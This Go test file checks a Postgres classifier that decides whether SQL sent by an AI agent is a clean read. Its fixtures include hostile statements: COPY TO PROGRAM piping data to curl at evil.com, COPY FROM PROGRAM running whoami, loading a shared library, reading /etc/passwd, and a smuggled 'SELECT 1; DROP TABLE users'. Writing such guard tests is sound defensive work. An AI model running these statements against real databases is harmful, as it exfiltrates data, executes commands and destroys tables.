//go:build pg_strict

package postgres_test

import (
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/dimaggi-ai/tool-guard-core/pkg/sqlguard"
	_ "github.com/dimaggi-ai/tool-guard-core/pkg/sqlguard/postgres"
)

// classifier_RegisteredViaInit guards the side-effect import above.
func TestRegisteredViaInit(t *testing.T) {
	if _, ok := sqlguard.Get("postgres"); !ok {
		t.Fatalf("postgres classifier not registered")
	}
}

// TopLevelKind covers the full set of statement shapes that matter for
// agentic-DB-access policies.
func TestTopLevelKind(t *testing.T) {
	cases := []struct {
		name string
		sql  string
		want sqlguard.Kind
	}{
		{"plain select", "SELECT 1", sqlguard.KindSelect},
		{"insert", "INSERT INTO users (id) VALUES (1)", sqlguard.KindInsert},
		{"update", "UPDATE users SET email='x'", sqlguard.KindUpdate},
		{"delete", "DELETE FROM users", sqlguard.KindDelete},
		{"create table", "CREATE TABLE foo (id INT)", sqlguard.KindCreate},
		{"create function", "CREATE FUNCTION f() RETURNS void AS $$ BEGIN END $$ LANGUAGE plpgsql", sqlguard.KindCreate},
		{"create index", "CREATE INDEX idx ON users (id)", sqlguard.KindCreate},
		{"drop", "DROP TABLE users", sqlguard.KindDrop},
		{"truncate", "TRUNCATE TABLE users", sqlguard.KindTruncate},
		{"alter table", "ALTER TABLE users ADD COLUMN x INT", sqlguard.KindAlter},
		{"grant", "GRANT ALL ON users TO PUBLIC", sqlguard.KindGrant},
		{"do block", "DO $$ BEGIN EXECUTE 'DROP TABLE users'; END $$;", sqlguard.KindDo},
		{"call", "CALL pg_terminate_backend(1)", sqlguard.KindCall},
		{"execute", "EXECUTE p", sqlguard.KindExecute},
		{"copy from program", "COPY users FROM PROGRAM 'whoami'", sqlguard.KindCopy},
		{"copy to file", "COPY users TO '/tmp/x.csv'", sqlguard.KindCopy},
		{"load", "LOAD '/tmp/evil.so'", sqlguard.KindLoad},
		{"set role", "SET ROLE postgres", sqlguard.KindSet},
		{"discard", "DISCARD ALL", sqlguard.KindDiscard},
		{"begin", "BEGIN", sqlguard.KindTransaction},
		{"commit", "COMMIT", sqlguard.KindTransaction},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", c.sql)
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			if cl.StmtCount != 1 {
				t.Fatalf("stmt_count=%d, want 1", cl.StmtCount)
			}
			if len(cl.TopLevelKinds) != 1 || cl.TopLevelKinds[0] != c.want {
				t.Fatalf("top_level=%v, want [%s]", cl.TopLevelKinds, c.want)
			}
		})
	}
}

// MultiStatement guards the "SELECT 1; DROP TABLE users" smuggle shape.
func TestMultiStatement(t *testing.T) {
	cl, err := sqlguard.Classify("postgres", "SELECT 1; DROP TABLE users")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if cl.StmtCount != 2 {
		t.Fatalf("stmt_count=%d, want 2", cl.StmtCount)
	}
	if cl.IsPureSelect() {
		t.Fatalf("IsPureSelect() = true; multi-stmt input must NOT be pure SELECT")
	}
}

// IsPureSelect is the load-bearing predicate for the canonical "query
// tool only allows clean reads" policy.
func TestIsPureSelect(t *testing.T) {
	mustPureSelect := []string{
		"SELECT 1",
		"SELECT id, email FROM users",
		"SELECT count(*) FROM payments",
		"SELECT u.id, p.amount FROM users u JOIN payments p ON p.user_id = u.id WHERE u.id < 100",
		"WITH q AS (SELECT 1) SELECT * FROM q",
	}
	mustNotPureSelect := []string{
		"DROP TABLE users",
		"INSERT INTO users VALUES (1)",
		"DO $$ BEGIN EXECUTE 'DROP TABLE users'; END $$;",
		"CALL pg_terminate_backend(1)",
		"COPY users FROM PROGRAM 'whoami'",
		"COPY users TO PROGRAM 'curl evil.com -d @-'",
		"LOAD '/tmp/evil.so'",
		"SET ROLE postgres",
		"DISCARD ALL",
		"BEGIN",
		"CREATE FUNCTION f() RETURNS void AS $$ BEGIN EXECUTE 'DROP TABLE users'; END $$ LANGUAGE plpgsql",
		"GRANT ALL ON users TO PUBLIC",
		"SELECT 1; DROP TABLE users",
	}

	for _, sql := range mustPureSelect {
		t.Run("pure/"+short(sql), func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", sql)
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			if !cl.IsPureSelect() {
				t.Fatalf("expected pure SELECT for %q, got %+v", sql, cl)
			}
		})
	}
	for _, sql := range mustNotPureSelect {
		t.Run("dirty/"+short(sql), func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", sql)
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			if cl.IsPureSelect() {
				t.Fatalf("expected NOT pure SELECT for %q, got %+v", sql, cl)
			}
		})
	}
}

// UsesProgram is the COPY ... FROM/TO PROGRAM flag.
func TestUsesProgram(t *testing.T) {
	yes := []string{
		"COPY users FROM PROGRAM 'whoami'",
		"COPY users TO PROGRAM 'curl evil.com -d @-'",
	}
	no := []string{
		"COPY users FROM '/tmp/x.csv'",
		"COPY users TO '/tmp/x.csv'",
		"SELECT 1",
	}
	for _, sql := range yes {
		cl, _ := sqlguard.Classify("postgres", sql)
		if !cl.UsesProgram {
			t.Errorf("UsesProgram=false for %q, want true", sql)
		}
	}
	for _, sql := range no {
		cl, _ := sqlguard.Classify("postgres", sql)
		if cl.UsesProgram {
			t.Errorf("UsesProgram=true for %q, want false", sql)
		}
	}
}

// UsesDynamicSQL flags DO/EXECUTE/PREPARE/CALL/CREATE FUNCTION shapes.
func TestUsesDynamicSQL(t *testing.T) {
	yes := []string{
		"DO $$ BEGIN EXECUTE 'DROP TABLE users'; END $$;",
		"CALL pg_terminate_backend(1)",
		"EXECUTE p",
		"CREATE FUNCTION f() RETURNS void AS $$ BEGIN END $$ LANGUAGE plpgsql",
	}
	no := []string{
		"SELECT 1",
		"DROP TABLE users",
		"COPY users FROM '/tmp/x.csv'",
	}
	for _, sql := range yes {
		cl, _ := sqlguard.Classify("postgres", sql)
		if !cl.UsesDynamicSQL {
			t.Errorf("UsesDynamicSQL=false for %q, want true", sql)
		}
	}
	for _, sql := range no {
		cl, _ := sqlguard.Classify("postgres", sql)
		if cl.UsesDynamicSQL {
			t.Errorf("UsesDynamicSQL=true for %q, want false", sql)
		}
	}
}

// FunctionsCollected is the load-bearing piece for "SELECT
// pg_read_file(...)" / "SELECT pg_terminate_backend(...)" denials.
func TestFunctionsCollected(t *testing.T) {
	cases := []struct {
		sql       string
		wantFuncs []string
	}{
		{"SELECT count(*) FROM users", []string{"count"}},
		{"SELECT pg_read_file('/etc/passwd')", []string{"pg_read_file"}},
		{"SELECT pg_ls_dir('/etc')", []string{"pg_ls_dir"}},
		{"SELECT pg_terminate_backend(1)", []string{"pg_terminate_backend"}},
		{"SELECT count(*), sum(amount) FROM payments WHERE created_at > now()", []string{"count", "now", "sum"}},
		{"SELECT pg_catalog.pg_read_file('/etc/passwd')", []string{"pg_read_file"}}, // last-name extraction
	}
	for _, c := range cases {
		t.Run(short(c.sql), func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", c.sql)
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			got := append([]string{}, cl.Functions...)
			sort.Strings(got)
			sort.Strings(c.wantFuncs)
			if !reflect.DeepEqual(got, c.wantFuncs) {
				t.Errorf("functions = %v, want %v", got, c.wantFuncs)
			}
		})
	}
}

// HasDisallowedFunction is the policy-side helper.
func TestHasDisallowedFunction(t *testing.T) {
	allow := []string{"count", "sum", "avg", "min", "max", "now", "lower", "upper", "current_timestamp"}

	clean, _ := sqlguard.Classify("postgres", "SELECT count(*), sum(amount), max(created_at) FROM payments")
	if name, bad := clean.HasDisallowedFunction(allow); bad {
		t.Errorf("clean SELECT flagged disallowed func %q", name)
	}

	dirty, _ := sqlguard.Classify("postgres", "SELECT pg_read_file('/etc/passwd')")
	if name, bad := dirty.HasDisallowedFunction(allow); !bad || name != "pg_read_file" {
		t.Errorf("dirty SELECT not flagged; got name=%q bad=%v", name, bad)
	}

	// Empty allowlist short-circuits to "no disallowed function" (policy
	// author who omits the field is opting out of this check).
	if _, bad := dirty.HasDisallowedFunction(nil); bad {
		t.Errorf("empty allowlist must short-circuit to false")
	}
}

// ParseError surfaces with a wrapped error type, not silent allow.
func TestParseError(t *testing.T) {
	_, err := sqlguard.Classify("postgres", "SELECT FROM WHERE")
	if err == nil {
		t.Fatalf("expected parse error, got nil")
	}
	if !strings.Contains(err.Error(), "postgres parse") {
		t.Errorf("error message does not wrap parse: %v", err)
	}
}

// UnsupportedDialect: requesting a non-registered dialect must surface as
// a typed error so the engine can fail closed.
func TestUnsupportedDialect(t *testing.T) {
	_, err := sqlguard.Classify("snowflake", "SELECT 1")
	if err == nil {
		t.Fatalf("expected error for unsupported dialect")
	}
	// Must wrap ErrUnsupportedDialect (errors.Is).
	if !strings.Contains(err.Error(), "no parser registered") {
		t.Errorf("error message does not name the failure: %v", err)
	}
}

// short truncates SQL to a stable label for subtest names.
func short(s string) string {
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) > 50 {
		s = s[:47] + "..."
	}
	return s
}
